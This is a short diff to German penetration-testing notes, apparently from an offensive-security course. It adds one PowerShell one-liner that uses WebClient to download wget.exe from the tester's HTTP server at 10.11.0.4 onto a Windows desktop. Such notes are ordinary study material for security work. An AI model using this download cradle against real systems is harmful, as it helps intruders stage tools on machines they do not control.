@@ -15,6 +15,7 @@ Mit folgendem Befehl kann überprüft werden, wie die Execution-Policy gesetzt i
 Mit #Powershell können auch #FileTransfers durchgeführt werden.
 Wie folgt wird ein #Download vorgenommen - Vorausetzung ist, dass auf dem Host ein HTTP-Server eröffnet wurde:
 
+`powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.11.0.4/wget.exe','C:\Users\offsec\Desktop\wget.exe')"`
 
 
 
